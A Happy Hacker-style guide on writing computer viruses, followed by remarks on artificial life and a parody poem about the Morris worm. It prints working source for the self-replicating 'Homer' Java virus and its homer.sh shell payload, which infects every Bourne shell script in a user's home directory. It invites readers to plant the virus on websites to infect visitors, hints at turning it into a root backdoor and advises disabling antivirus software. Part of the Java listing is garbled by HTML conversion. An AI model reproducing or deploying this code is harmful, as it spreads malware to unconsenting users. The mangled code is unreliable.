<P>How to Write Them

<P>&nbsp;Wait!&nbsp; Wait!&nbsp; This is supposed to be about mostly harmless
hacking!&nbsp; Is
<BR>Carolyn really going to tell all the newbies how to write computer
viruses?
<BR>&nbsp;Yes, I am.&nbsp; I will tell you how to really write computer
viruses, not just
<BR>use some lamer program like Virus Workshop that writes weak, helpless
little
<BR>viruses for you. However, to use the information in this Guide you
must know
<BR>how to compile Java or use assembly language.&nbsp; If you can master
these, you
<BR>probably have enough willingness to work hard that you will not abuse
the
<BR>knowledge of how to code viruses.&nbsp; At least that's my theory --
please don't
<BR>prove me wrong!
<BR>&nbsp;Besides, the only way to fight dangerous viruses is to know exactly
how to
<BR>write them.
<BR>&nbsp;First, if you are like me, you may already be struggling with
the
<BR>temptation to install a Java virus on your Web site to infect unwary
<BR>visitors.&nbsp; Yes, I really am going to show you how to do this.&nbsp;
However, it
<BR>is a (mostly) harmless virus.&nbsp; (Aw, darn!)

<P>****************************************************************
<BR>You can go to jail warning:&nbsp; This Guide only offers source code
for a
<BR>(mostly) harmless virus.&nbsp; However, some people are so terrified
of and
<BR>ignorant about viruses that you just might get into big trouble if
you
<BR>really put this Java virus on your Web page.&nbsp; Suggestion: if you
absolutely
<BR>cannot resist, how about putting it on a link with the flashing message
<BR>"Danger! Do not click here!&nbsp; If you do, you might catch a virus!&nbsp;
Honest!!!
<BR>Would I lie to you?!!??"
<BR>****************************************************************

<P>****************************************************************
<BR>You can get punched in the nose warning: Some people don't care if
a virus
<BR>is (mostly) harmless or even entirely harmless.&nbsp; These guys are
terrified of
<BR>viruses.&nbsp; If some guy who browses your Web site catches your virus
and has a
<BR>fit and sues you or tracks you down and punches you in the nose, remember,
<BR>you asked for it.&nbsp; Don't expect me to feel sorry for you.
<BR>*****************************************************************

<P>&nbsp;OK, folks, here it is, a Java virus.&nbsp; The following source
code for the
<BR>Homer virus is available on the floppy disk that accompanies "The Giant
<BR>Black Book of Computer Viruses" by Dr. Mark Ludwig:

<P>/* Homer.java by Mark D. LaDue */

<P>/* This Java application infects your UNIX system with a Bourne shell
<BR>&nbsp;&nbsp; script virus, homer.sh.&nbsp; homer.sh is kind enough
to announce itself
<BR>&nbsp;&nbsp; and inform you that "Java is safe, and UNIX viruses do
not exist"
<BR>&nbsp;&nbsp; before finding all of the Bourne shell scripts in your
home directory,
<BR>&nbsp;&nbsp; checking to see if they've already been infected, and
infecting
<BR>&nbsp;&nbsp; those that are not.&nbsp; homer.sh infects another Bourne
shell script
<BR>&nbsp;&nbsp; by simply appending a working copy of itself to the end
of that shell
<BR>&nbsp;&nbsp; script.&nbsp; */
<BR>&nbsp;

<P>import java.io.*;

<P>class Homer {
<BR>&nbsp;&nbsp;&nbsp; public static void main (String[] argv) {
<BR>&nbsp;&nbsp;&nbsp; try {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; String userHome = System.getProperty("user.home");
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; String target = "$HOME";
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FileOutputStream outer =
new FileOutputStream(userHome + "/.homer.sh");
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; String homer = "#!/bin/sh"
+ "\n" + "#-_" + "\n" +
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "echo \"Java is safe, and
UNIX viruses do not exist.\"" + "\n" +
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "for file in `find " + target
+ " -type f -print`" + "\n" + "do" +
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\n" + "&nbsp;&nbsp;&nbsp;
case \"`sed 1q $file`\" in" + "\n" +
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;

<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; " || sed -n '/#-_/,$p' $0

<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "&nbsp;&nbsp;&nbsp; esac"
+ "\n" + "done" + "\n" +
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "2>/dev/null";
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; byte[] buffer = new byte[homer.length()];
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; homer.getBytes(0, homer.length(),
buffer, 0);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; outer.write(buffer);
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; outer.close();
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Process chmod = Runtime.getRuntime().exec("/usr/bin/chmod
777 " +
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
userHome + "/.homer.sh");
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Process exec = Runtime.getRuntime().exec("/bin/sh
" + userHome +
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
"/.homer.sh");
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } catch (IOException ioe)
{}
<BR>&nbsp;&nbsp;&nbsp; }
<BR>}

<P>&nbsp;If you post this source code to you web site -- it will do nothing!&nbsp;
That
<BR>is because this code must first be compiled in order to do its business.&nbsp;
If
<BR>you don't know how to compile Java source code for your Web page, you
don't
<BR>know enough to safely handle viruses.
<BR>&nbsp;Also, you need to put the code for the shell script, homer.sh,
on your Web
<BR>site so this Java program can ship it to your victims.&nbsp; Following
is the
<BR>code for homer.sh:
<BR>&nbsp;

<P>#!/bin/sh

<P>#-_

<P>echo "Java is safe, and UNIX viruses do not exist."

<P>for file in `find $HOME -type f -print`

<P>do

<P>&nbsp;&nbsp;&nbsp; case "`sed 1q $file`" in

<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "#!/bin/sh" ) grep '#-_'
$file > /dev/null || sed -n '/#-_/,$p' $0
<BR>>> $file

<P>&nbsp;&nbsp;&nbsp; esac

<P>done

<P>&nbsp;2>/dev/null

<P>&nbsp;In case you are wondering what this virus does -- it flashes a
message on
<BR>the victim's screen reading "Java is safe, and UNIX viruses do not
exist."
<BR>For more information on how shell scripts work, see the GTMHHs on shell
<BR>programming.)
<BR>&nbsp;Homer is a harmless, humorous shell virus.&nbsp; However, it
doesn't take a
<BR>genius to see how it could be given a destructive payload by modifying
<BR>homer.sh.&nbsp; If someone were to be dumb enough to surf your booby-trapped
<BR>Website while logged in as root, it would be trivial to use a homer.sh
<BR>modified to give you a root shell with your very own back door.
<BR>&nbsp;However, in general Java viruses are not terribly dangerous because
they
<BR>run so slowly.&nbsp; This gives their victims time to get suspicious
and
<BR>terminate these programs.&nbsp; Presumably a Java virus would take
so long to
<BR>create a root shell and back door that the victim would kill the process
in
<BR>time.

<P>********************************************************************
<BR>Newbie note: Don't ever surf the Web while logged in as root. Don't
ever try
<BR>to break into someone else's computer while logged in as root.&nbsp;
Any time you
<BR>are running as root, it is really easy for you to mess up your Unix
<BR>computer.&nbsp; If you check out the phf abuse log at the Hacker Wargame
section
<BR>of <A HREF="http://www.happyhacker.org">http://www.happyhacker.org</A>,
you will see that quite a few people have
<BR>tried to break into our webserver while running a Web browser and logged
in
<BR>as root.
<BR>********************************************************************

<P>&nbsp;The problem of some programs running really slowly is a major
reason why
<BR>you can't do much as a virus or antivirus programmer unless you also
learn
<BR>at least one assembly language.&nbsp; Assembly language is fast!&nbsp;
No time for the
<BR>victim to react!&nbsp; It also makes it easy for you to do complex
and
<BR>infuriating things while a computer is only beginning to boot up.&nbsp;
For DOS
<BR>and Windows you will need an assembly language compiler for 80x86
<BR>(substitute 2, 3, 4, 5)/Pentium type computers.&nbsp; Two of the best
are
<BR>Microsoft Macro Assembler and Borland Turbo Assembler.&nbsp; Places
where you can
<BR>get them (you have to pay, they are not free) include
<BR><A HREF="http://www.pparadise.com">http://www.pparadise.com</A> and
<A HREF="http://www.supershops.com">http://www.supershops.com</A>.
<BR>&nbsp;If you are really serious about learning how to write viruses
and
<BR>antiviruses, you may want to get the "Giant Black Book of Computer
Viruses,
<BR>Second Edition," by Dr. Mark Ludwig.&nbsp; Not only is he one of the
world's
<BR>leading virus researchers -- he also is the only one I have discovered
who
<BR>will tell you EXACTLY in almost endless detail how to write viruses
and
<BR>antiviruses of many sorts.&nbsp; However, this book is not for newbies.&nbsp;
He
<BR>assumes you already know a great deal about DOS, Windows and Unix,
and are a
<BR>programmer.
<BR>&nbsp;It comes with a floppy disk with source code for many viruses.&nbsp;
Here are
<BR>some hints for how to extract these viruses from this disk successfully
and
<BR>without killing your computer.

<P>1) This disk is designed to be installed from MS-DOS.&nbsp; If you try
to install
<BR>it from Windows, it will give you a runtime error.&nbsp; If you don't
know how to
<BR>work from MS-DOS, you aren't ready for this book.

<P>2) The installation program for Dr. Ludwig's virus disk ought to activate
<BR>your antivirus program.&nbsp; If it doesn't, your antivirus program
is even more
<BR>worthless than most.&nbsp; To be certain that you can succeed in installing
a
<BR>directory full of viruses, deactivate your antivirus program(s) first.&nbsp;
If
<BR>this sounds too scary to you, don't buy this book! If you mess up your
<BR>computer by following my advice, too bad, that's what you get for playing
<BR>with viruses.

<P>3) Here's what Dr. Ludwig's installation program will tell you:

<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
! ! W A R N I N G ! !

<P>If you're like most computer users, you've grown used to being pampered.
<BR>That's a nice way of saying that software developers no longer expect
you to
<BR>have a brain. Like a stupid monkey, all you need to do is put the CD
in the
<BR>drive and let it auto-execute, or put the floppy disk in the drive
and type
<BR>"setup".

<P>If that's what you want and need, THEN DELETE THIS SOFTWARE OFF YOUR
<BR>COMPUTER IMMEDIATELY AND DESTROY THE DISK WITH A HAMMER! We're really
not
<BR>kidding about that. This disk is for thinking beings. Improperly used
it
<BR>could be very dangerous. It could ruin your computer, your career and
your
<BR>life. THAT IS NOT A JOKE.

<P>DO NOT EXECUTE ANY PROGRAM IN THIS DIRECTORY UNLESS YOU KNOW WHAT IT
DOES.

<P>DO NOT EXECUTE ANY PROGRAM IN THIS DIRECTORY EXCEPT IN A CONTROLLED
ENVIRONMENT.

<P>&nbsp;I suppose now you just can't resist buying this book.&nbsp; Guess
what -- you
<BR>can't get it in any bookstore.&nbsp; They are all afraid of getting
sued.&nbsp; Also,
<BR>in some countries, mere possession of "The Giant Black Book of Computer
<BR>Viruses" is illegal.&nbsp; Just to be safe, you might want to delete
this GTMHH
<BR>right now and only read it from our Web site at <A HREF="http://www.happyhacker.org">http://www.happyhacker.org</A>.
<BR>&nbsp;If you are absolutely determined to get this book, within the
US you can
<BR>order it from American Eagle Publications by phoning toll free 800-719-4957;
<BR>outside the US you can order it by calling (insert country code here)
<BR>520-367-1621.&nbsp; It costs $39.95.&nbsp; This price includes the
floppy disk with
<BR>all that stuff that upsets your antivirus program.&nbsp; Shipping and
handling
<BR>costs are extra.
<BR>&nbsp;If you live within the US, you can also buy "The Giant Black
Book of
<BR>Computer Viruses" by sending $44.95 (this includes shipping by Priority
<BR>mail, which is supposed to take two days) made out to M/B Research,
PO Box
<BR>1520, Cedar Crest NM 87008.&nbsp; That's my company.&nbsp; Sorry, I'm
not going to
<BR>ship the book outside the US because I don't know in which countries
it is
<BR>illegal.&nbsp; I would feel really bad if you were to go to your post
office to
<BR>pick up the book and instead got picked up by the police.
<BR>&nbsp;American Eagle can get the book to you at the lowest shipping
cost, if you
<BR>don't mind it taking a long time to get to you.&nbsp; I can get it
to you faster,
<BR>but it costs you more for the shipping.
<BR>&nbsp;If you want to buy "The Giant Black Book of Computer Viruses"
with a credit
<BR>card over the Internet, check out <A HREF="http://www.amazon.com">http://www.amazon.com</A>
and
<BR><A HREF="http://www.infowar.com">http://www.infowar.com</A>.&nbsp;
Amazon.com will usually take much longer to get the
<BR>book to you than any other book seller, however.
<BR>&nbsp;
<BR>How to Write Viruses and Not Get Lynched
<BR>&nbsp;
<BR>&nbsp;Just imagine how people will react when you are at some party
full of
<BR>ambitious young professionals.&nbsp; Everyone is trading business cards.&nbsp;
You
<BR>hand out ones that say "George the Doomster.&nbsp; Computer virus design.&nbsp;
Free
<BR>samples, muhahaha."&nbsp; You'll be real popular, yes sirree!
<BR>&nbsp;OK, so you only plan on writing harmless viruses.&nbsp; Try to
tell that to the
<BR>lynch mob that may pay you a visit when they discover it was you who
wrote
<BR>the code that made their Win95 computers come down with habitual General
<BR>Protection Faults.&nbsp; Remember, even the virus designer who has
the best of
<BR>intentions may write a seemingly harmless or even beneficial virus
that
<BR>turns out to have a bug in the code that accidentally does harm.&nbsp;
Also,
<BR>since the best viruses are memory resident (they hide in RAM memory)
they
<BR>really can help create General Protection Faults just by hogging too
much
<BR>memory.
<BR>&nbsp;Besides, people like to pick and choose what programs run on
their
<BR>computers.&nbsp; Imagine that!&nbsp; If you design a virus so it will
sneak into
<BR>computers, don't expect people to thank you and admire you.&nbsp; If
you do
<BR>choose to code a virus, please consider coding politeness into it.&nbsp;
You
<BR>could have it ask permission to take up residence on each new computer
and
<BR>leave when asked.&nbsp; Shoot, if I could find a copy of that virus
that makes a
<BR>mirror image of Windows desktop graphics each Saturday, and if I knew
how to
<BR>uninstall it without paying a bunch of money to Panda Software, I'd
enjoy
<BR>sharing my computer with it.

<P>Artificial Life

<P>&nbsp;Now that you understand the basic principles of virus coding,
let's take a
<BR>look at the Big Time: using your programming talents to create -- or
battle
<BR>against -- artificial life.
<BR>&nbsp;Just what is artificial life (insiders call it "alife"), anyhow?
According
<BR>to the most prominent researcher in this field, Dr. Chris Langton,
<BR>artificial life is "... the study of man-made systems that exhibit
<BR>behaviours characteristic of natural living systems." -- "Artificial
Life,"
<BR>edited by Chris Langton, Addison-Wesley, 1988.&nbsp; Youc an get this
book from
<BR><A HREF="http://www.amazon.com">http://www.amazon.com</A>.
<BR>&nbsp;There are three primary forms of alife.&nbsp; Some alife is growing
-- or trying
<BR>to grow -- in test tubes full of RNA (ribonucleic acid) or other chemicals.
<BR>The second major form of alife consists of computerized robots which
their
<BR>creators hope to will someday achieve the ability to adapt and reproduce
<BR>without human assistance.&nbsp; The third type of alife is computer
programs that
<BR>exist, adapt, reproduce and evolve in the virtual landscape of cyberspace
--
<BR>what we know as computer viruses.
<BR>&nbsp;Of all the forms of artificial life, computer viruses are the
only ones so
<BR>far that reproduce, escape the laboratory and take up life in the wild.
<BR>Viruses that follow rules of good behavior -- only living in computers
when
<BR>invited -- are often created by alife researchers.
<BR>&nbsp;How can you meet and get involved with alife designers?
<BR><A HREF="http://alife.santafe.edu/alife/events/">http://alife.santafe.edu/alife/events/</A>
and <A HREF="http://alife6.alife.org/">http://alife6.alife.org/</A> offer
<BR>listings of upcoming conferences on this topic from around the world.
<BR>Closely related to artificial life is the Berkeley Initiative in Soft
<BR>Computing (BISC) at <A HREF="http://http.cs.berkeley.edu/projects/Bisc">http://http.cs.berkeley.edu/projects/Bisc</A>.&nbsp;
If you want
<BR>to volunteer to harbor artificial life viruses on your computer or
LAN, you
<BR>can probably find a researcher at one of these sites who would be happy
to
<BR>give you some of his or her harmless (you hope) creations.
<BR>&nbsp;American Eagle also sells a book "Computer Viruses, Artificial
Life and
<BR>Evolution" by Dr. Ludwig (American Eagle, 1993).&nbsp; It costs $26.95
and is
<BR>almost impossible to get unless you order it directly from American
Eagle.

<P>Virus Humor

<P>&nbsp;As we end this Guide, please remember that with the right attitude,
viruses
<BR>actually can be fun!&nbsp; Next time your computer gets infected by
one, just
<BR>remember, don't worry, be happy.&nbsp; Following is some virus humor
to show how
<BR>other people have coped cheerfully with an encounter with this pesky
new
<BR>life form.

"The Worm Before Christmas"
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
by Clement C. Morris

<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (a.k.a.
David Bradley, Betty Cheng, Hal Render,
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Greg Rogers, and Dan LaLiberte)

<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'Twas the night before finals,
and all through the lab
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Not a student was sleeping,
not even McNabb.
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Their projects were finished,
completed with care
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; In hopes that the grades
would be easy (and fair).

<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The students were wired with
caffeine in their veins
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; While visions of quals nearly
drove them insane.
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; With piles of books and
a brand new highlighter,
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; I had just settled down
for another all nighter ---

<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; When out from our gateways
arose such a clatter,
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; I sprang from my desk to
see what was the matter;
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Away to the console I flew
like a flash,
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; And logged in as root to
fend off a crash.

<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The windows displayed on
my brand new Sun-3,
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Gave oodles of info ---
some in 3-D.
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; When, what to my burning
red eyes should appear
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; But dozens of "nobody" jobs.&nbsp;
Oh dear!

<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; With a blitzkrieg invasion,
so virulent and firm,
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; I knew in a moment, it was
Morris's Worm!
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; More rapid than eagles his
processes came,
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; And they forked and exec'ed
and they copied by name:

<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "Now Dasher!&nbsp; Now Dancer!&nbsp;
Now, Prancer and Vixen!
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On Comet!&nbsp; On Cupid!&nbsp;
On Donner and Blitzen!
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; To the sites in .rhosts
and host.equiv
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Now, dash away!&nbsp; dash
away!&nbsp; dash away all!"

<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; And then in a twinkling,
I heard on the phone,
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The complaints of the users.&nbsp;
(Thought I was alone!)
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "The load is too high!"&nbsp;
"I can't read my files!"
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "I can't send my mail over
miles and miles!"

<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; I unplugged the net, and
was turning around,
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; When the worm-ridden system
went down with a bound.
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; I fretted.&nbsp; I frittered.&nbsp;
I sweated.&nbsp; I wept.
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Then finally I core dumped
the worm in /tmp.

<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; It was smart and pervasive,
a right jolly old stealth,
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; And I laughed, when I saw
it, in spite of myself.
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; A look at the dump of that
invasive thread
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Soon gave me to know we
had nothing to dread.

<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The next day was slow with
no network connections,
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; For we wanted no more of
those pesky infections.
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; But in spite of the news
and the noise and the clatter,
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Soon all became normal,
as if naught were the matter.

<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Then later that month while
all were away,
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; A virus came calling and
then went away.
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The system then told us,
when we logged in one night:
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "Happy Christmas to all!&nbsp;
(You guys aren't so bright.)"

<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ Note:&nbsp; The machines
dasher.cs.uiuc.edu,
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dancer.cs.uiuc.ed,
prancer.cs.uiuc.edu, etc. have
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; been renamed
deer1, deer2, deer3, etc. so as not
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; to confuse the
already burdened students who use
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; those machines.
We regret that this poem reflects
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; the older naming
scheme and hope it does not confuse
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; the network
administrator at your site.&nbsp; -Ed.]
